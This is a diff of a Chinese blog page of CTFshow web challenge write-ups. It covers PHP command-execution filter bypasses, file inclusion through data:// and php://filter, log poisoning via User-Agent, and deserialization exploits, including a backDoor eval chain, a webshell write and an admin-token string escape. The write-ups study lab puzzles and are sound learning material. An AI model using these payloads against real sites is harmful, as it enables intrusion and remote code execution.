+<pre><code class="highlight plaintext">&lt;?php
 error_reporting(0);
 if(isset($_GET[&#x27;c&#x27;]))&#123;
     $c = $_GET[&#x27;c&#x27;];
@@ -493,25 +629,22 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;</code></pre>
-
 <p>三种方法：</p>
 <ul>
 <li>空格替代</li>
 </ul>
 <pre><code class="highlight plaintext">?c=echo%09`tac%09fl*`;//这边&#123;IFS&#125;出于未知原因是不可用的</code></pre>
-
 <ul>
 <li>eval传参</li>
 </ul>
 <pre><code class="highlight plaintext">?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</code></pre>
-
 <ul>
 <li>无参数</li>
 </ul>
 <pre><code class="highlight plaintext">eval(end(current(get_defined_vars())));&amp;b=system(&#x27;tac fl*&#x27;);
 show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>
-
-<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web32"><a class="markdownIt-Anchor" href="#web32"></a> web32</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
@@ -522,31 +655,25 @@ show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <p>这里不看过滤字符串(问就是没必要，还没过滤的很死)</p>
 <p>看一眼过滤了</p>
 <pre><code class="highlight plaintext">. 空格 &#x27; ` ;  (</code></pre>
-
 <p>括号都过滤掉了吗。哈基c你这家伙，但是不影响</p>
 <p>这里放弃直接shell的想法，尝试用伪协议作为帮手</p>
 <pre><code class="highlight plaintext">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
 ?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</code></pre>
-
 <p>为什么这个<code>?&gt;</code>可以用呢?</p>
 <p>看其他师傅的解释说是<code>?&gt;</code>可以 闭合 php（ ?&gt; 闭合的是 eval 里面的 php 语句，eval 后续还有语句的话，依旧是会执行的。)</p>
 <pre><code class="highlight plaintext">具体的来说，对于include
 空格是个可有可无的东西，即使没有空格它也能从上下文中判断 $var 是变量，它会优先解析变量，然后再处理语句。
 ?&gt;这部分在这里也很神必，eval解析php语句，而后面的?&gt;直接被当作了无效文字不被处理，而在?&gt;前的语句不加;是无所谓的</code></pre>
-
 <p>多说无益，自己调一眼看看</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708105538411.png" alt="image-20250708105538411"></p>
 <p>可以看到后面的语句正常执行了</p>
 <p>php，很神奇吧。。</p>
 <pre><code class="highlight plaintext">base64是什么几把，我直接php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php当懒狗爽赤😋</code></pre>
-
-
-
-<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web33"><a class="markdownIt-Anchor" href="#web33"></a> web33</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
@@ -557,13 +684,12 @@ show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( &quot;</code></pre>
-
 <p>双引号也没了</p>
-<p>但是我前一个好像没用过””啊。。</p>
+<p>但是我前一个好像没用过&quot;&quot;啊。。</p>
 <p>秒赤</p>
-<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web34"><a class="markdownIt-Anchor" href="#web34"></a> web34</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
@@ -574,11 +700,10 @@ show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <pre><code class="highlight plaintext">. 空格 ` &#x27; ; ( : &quot;</code></pre>
-
 <p>木大木大木大！没有实质用处的过滤哒!和上上个凑一桌去</p>
-<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web35"><a class="markdownIt-Anchor" href="#web35"></a> web35</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
@@ -589,11 +714,10 @@ show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( : &quot; &lt; =</code></pre>
-
 <p>和上上上个一桌</p>
-<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web36"><a class="markdownIt-Anchor" href="#web36"></a> web36</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
@@ -604,12 +728,11 @@ show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <pre><code class="highlight plaintext">. 空格 &#x27; ` ; ( : &quot; &lt; = / 数字</code></pre>
-
 <p>数字换成字母</p>
 <p>然后和上上上上个一桌</p>
-<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre><code class="highlight plaintext">&lt;?php
+<h3 id="web37"><a class="markdownIt-Anchor" href="#web37"></a> web37</h3>
+<pre><code class="highlight plaintext">&lt;?php
 //flag in flag.php
 error_reporting(0);
 if(isset($_GET[&#x27;c&#x27;]))&#123;
@@ -624,22 +747,20 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
     highlight_file(__FILE__);
 &#125;
 ?&gt;</code></pre>
-
 <p>嗯。。这里直接<code>include</code>了，直接伪协议吧</p>
 <pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>
-
-<p>这里base64是<code>&lt;?php system(&#39;tac flag.php&#39;); ?&gt;</code></p>
+<p>这里base64是<code>&lt;?php system('tac flag.php'); ?&gt;</code></p>
 <p>或者其实都能命令执行了你用<code>*</code>偷个懒也没事</p>
-<p>这里为什么<code>php://input</code>用谷歌浏览器的hackbar会出现执行不了的情况(因为这啥比post没有&#x3D;就发不了包)</p>
+<p>这里为什么<code>php://input</code>用谷歌浏览器的hackbar会出现执行不了的情况(因为这啥比post没有=就发不了包)</p>
 <p>只有在包手动改才可以</p>
 <p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250708121634882.png" alt="image-20250708121634882"></p>
 <p>也可以尝试包含一下日志</p>
 <pre><code class="highlight plaintext">nginx 的日志文件 /var/log/nginx/access.log</code></pre>
-
 <p>包含完发现记录了UA头，尝试一下UA头注入</p>
-<p><code>User-Agent: &lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p>
-<p>在&#x2F;路由下注入再包含就可以看到被执行</p>
-<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<p><code>User-Agent: &lt;?php system('tac flag.php');?&gt;</code></p>
+<p>在/路由下注入再包含就可以看到被执行</p>
+<h3 id="web38"><a class="markdownIt-Anchor" href="#web38"></a> web38</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="comment">//flag in flag.php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
@@ -651,17 +772,15 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
-<p><del>简直说的和你上一题可以用这file一样</del></p>
+<p><s>简直说的和你上一题可以用这file一样</s></p>
 <p>咳咳，看到过滤了<code>flag php file</code></p>
 <p>考虑用data伪协议</p>
 <pre><code class="highlight plaintext">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTsgPz4=</code></pre>
-
 <p><code>妈的忘了还有短标签了。</code></p>
 <pre><code class="highlight plaintext">?c=data://text/plain,&lt;?=system(&quot;tac fl*&quot;)?&gt;</code></pre>
-
 <p>当然的当然这题用日志包含还是可以做</p>
-<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code class="highlight plaintext">&lt;?php
+<h3 id="web39"><a class="markdownIt-Anchor" href="#web39"></a> web39</h3>
+<pre><code class="highlight plaintext">&lt;?php
 //flag in flag.php
 error_reporting(0);
 if(isset($_GET[&#x27;c&#x27;]))&#123;
@@ -673,14 +792,13 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;</code></pre>
-
 <p>用一个小小的后缀乱我道心吗。。</p>
 <pre><code class="highlight plaintext">?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;//
 ?c=data://text/plain,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;&lt;?php</code></pre>
-
 <p>两种都行，总之闭合把后面的去掉就行</p>
 <p>但是其实不去也行，聪明的php会把后面的后缀当成html直接显示</p>
-<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web40"><a class="markdownIt-Anchor" href="#web40"></a> web40</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
     <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;
@@ -690,18 +808,16 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <p>啊呀！骇死我力</p>
 <p>过滤了数字</p>
 <pre><code class="highlight plaintext">~ ` @ # $ % ^ &amp; * （ ） - = + &#123; &#125; [ ] : &#x27; &quot; , &lt; . &gt; / ? \</code></pre>
-
 <p>符号基本都用不了了</p>
 <p>但是您猜怎么着?哎!他这是个中文输入法的括号</p>
 <p>无参数rce伺候</p>
 <pre><code class="highlight plaintext">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
 ?c=session_start();system(session_id());</code></pre>
-
-<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web41"><a class="markdownIt-Anchor" href="#web41"></a> web41</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];
 <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;
@@ -711,28 +827,27 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;
 <span class="meta">?&gt;</span></code></pre>
-
 <p>无数字字母rce</p>
 <p><code>~ $</code>不给用，自增取反异或都用不了辣</p>
 <p>不异或能怎么办呢。。你看这里是不是还有个<code>|</code>可以用</p>
 <p>利用或来构造字符即可</p>
-<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web42"><a class="markdownIt-Anchor" href="#web42"></a> web42</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
     <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <p><strong>解法1</strong>：</p>
 <p>利用||管道符的特性</p>
 <p><code>如果||左边的命令（command1）未执行成功，那么就执行||右边的命令（command2）；或者换句话说，“如果这个命令执行失败了||那么就执行这个命令。</code></p>
 <p><strong>解法2</strong>:</p>
-<p>换行来绕过，这个语句本身的意思就是重定向输出表示不回显，(你在反弹shell&#x2F;提权的时候或许见到过它)</p>
+<p>换行来绕过，这个语句本身的意思就是重定向输出表示不回显，(你在反弹shell/提权的时候或许见到过它)</p>
 <pre><code class="highlight plaintext">?c=tac flag.php%0a</code></pre>
-
 <p>所以同理只要能分割命令的基本都是没有问题的</p>
-<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web43"><a class="markdownIt-Anchor" href="#web43"></a> web43</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;
     <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];
     <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;
@@ -741,10 +856,10 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;<span class="keyword">else</span>&#123;
     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 &#125;</code></pre>
-
 <p><code>;</code>不能用了，但是计划通</p>
 <p>同web42</p>
-<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code class="highlight plaintext">&lt;?php
+<h3 id="web44"><a class="markdownIt-Anchor" href="#web44"></a> web44</h3>
+<pre><code class="highlight plaintext">&lt;?php
 
 if(isset($_GET[&#x27;c&#x27;]))&#123;
     $c=$_GET[&#x27;c&#x27;];
@@ -754,9 +869,11 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
 &#125;else&#123;
     highlight_file(__FILE__);
 &#125;</code></pre>
-
 <p>换通配符，没了</p>
-<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web56"><a class="markdownIt-Anchor" href="#web56"></a> web56</h3>
+<h2 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h2>
+<h3 id="web254"><a class="markdownIt-Anchor" href="#web254"></a> web254</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
@@ -804,9 +921,9 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
         <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
     &#125;
 &#125;</code></pre>
-
 <p>就是简单的传。别想歪了(谁想歪了我不说)</p>
-<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web255"><a class="markdownIt-Anchor" href="#web255"></a> web255</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
@@ -842,7 +959,6 @@ if(isset($_GET[&#x27;c&#x27;]))&#123;
         <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
     &#125;
 &#125;</code></pre>
-
 <p>不帮你创，让你自己搞一搞，序列化入门说是</p>
 <pre><code class="highlight plaintext">&lt;?php
 class ctfShowUser&#123;
@@ -852,11 +968,11 @@ class ctfShowUser&#123;
 &#125;
 $A=new ctfShowUser();
 echo serialize($A);</code></pre>
-
 <p>发现传不进去，一查发现<strong>Cookie中将”作为截断符号</strong></p>
-<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710161829381.png" alt="image-20250710161829381"></p>
+<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250710161829381.png" alt="image-20250710161829381"></p>
 <p>感觉分号也不是很友好啊。<code>url编码整一个</code></p>
-<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web256"><a class="markdownIt-Anchor" href="#web256"></a> web256</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
@@ -897,9 +1013,9 @@ echo serialize($A);</code></pre>
         <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
     &#125;
 &#125;</code></pre>
-
 <p>比上一题多了个<code>username!=passwd</code></p>
-<h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web257"><a class="markdownIt-Anchor" href="#web257"></a> web257</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
@@ -935,7 +1051,6 @@ echo serialize($A);</code></pre>
     <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
     <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
 &#125;</code></pre>
-
 <p>这里看上部分即可</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
@@ -965,7 +1080,6 @@ echo serialize($A);</code></pre>
         <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
     &#125;
 &#125;</code></pre>
-
 <p>直接利用<code>backDoor</code>类来RCE</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
@@ -983,9 +1097,9 @@ echo serialize($A);</code></pre>
 <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
 <span class="variable">$a</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span>
 <span class="class"><span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>($<span class="title">a</span>));</span></code></pre>
-
 <p>成功执行</p>
-<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web258"><a class="markdownIt-Anchor" href="#web258"></a> web258</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 
@@ -1030,9 +1144,9 @@ echo serialize($A);</code></pre>
     &#125;
     <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
 &#125;</code></pre>
-
-<p>Cookie不允许O&#x2F;C开头，后面不准接数字</p>
-<h3 id="web259-open"><a href="#web259-open" class="headerlink" title="web259(open)"></a>web259(open)</h3><pre><code class="highlight plaintext">
+<p>Cookie不允许O/C开头，后面不准接数字</p>
+<h3 id="web259open"><a class="markdownIt-Anchor" href="#web259open"></a> web259(open)</h3>
+<pre><code class="highlight plaintext">
 $xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);
 array_pop($xff);
 $ip = array_pop($xff);
@@ -1044,8 +1158,8 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 		file_put_contents(&#x27;flag.txt&#x27;,$flag);
 	&#125;
 &#125;</code></pre>
-
-<h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web260"><a class="markdownIt-Anchor" href="#web260"></a> web260</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
@@ -1054,15 +1168,14 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;
     <span class="keyword">echo</span> <span class="variable">$flag</span>;
 &#125;</code></pre>
-
 <p>本来在想是不是要用原生类的，但是发现好像是杀鸡用牛刀，还是对反序列化这边有一些偏执的固有印象啊。。</p>
 <p>希望后面能消除这种偏见。</p>
 <p>这里直接序列化一个字符串即可</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="variable">$a</span>=<span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;
 <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</code></pre>
-
-<h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web261"><a class="markdownIt-Anchor" href="#web261"></a> web261</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
 
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
 
@@ -1101,7 +1214,6 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 &#125;
 
 <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</code></pre>
-
 <p>几个创建时候调用的魔术方法可以直接不看了。。</p>
 <p>这里了解到了从7.4.0开始，如果类中同时定义了 <code>__unserialize() 和 __wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，__wakeup() 方法会被忽略，那么直接触发文件写入写马即可</p>
 <p>结合<code>__unserialize</code>内的代码，可以看出这边是一个弱比较</p>
@@ -1113,9 +1225,9 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 &#125;
 <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();
 <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</code></pre>
-
 <p>最后蚁剑即可</p>
-<h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<h3 id="web262"><a class="markdownIt-Anchor" href="#web262"></a> web262</h3>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
     <span class="comment">/*</span>
 <span class="comment"># -*- coding: utf-8 -*-</span>
 <span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
@@ -1152,7 +1264,6 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 &#125;
 
 <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>
-
 <p>一眼字符串逃逸</p>
 <p>但是传完cookie干什么呢。。猜测是要逃逸user为amdin，那就扫一下有没有其他的php文件存在哈,就扫出来一个<code>flag.php</code></p>
 <p>后来根据其他师傅的wp才发现注释里有一个<code>message.php</code>，眼瞎领域大神发力了嘻嘻</p>
@@ -1179,7 +1290,6 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
         <span class="keyword">echo</span> <span class="variable">$flag</span>;
     &#125;
 &#125;</code></pre>
-
 <p>所以这边构造一下在访问message.php就可以过了</p>
 <pre><code class="highlight php"><span class="meta">&lt;?php</span>
 <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
@@ -1192,22 +1302,20 @@ if($ip!==&#x27;127.0.0.1&#x27;)&#123;
 <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">message</span>();
 <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
 <span class="comment">//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;&quot;;s:5:&quot;token&quot;;s:4:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</span></code></pre>
-
 <p>这边后边是27个字符，那就要27个多出来的字符来保证后面的字符逃逸掉，刚好替换后每个多1位，那么就构造27个<code>fuck</code>就可</p>
 <pre><code class="highlight plaintext">f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre>
-
 <p>常规的打完看看能不能直接打<code>message.php</code>，毕竟就传个cookie的事情</p>
 <p>拿到原Cookie<code>O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;1&quot;;s:2:&quot;to&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></p>
 <p>直接改</p>
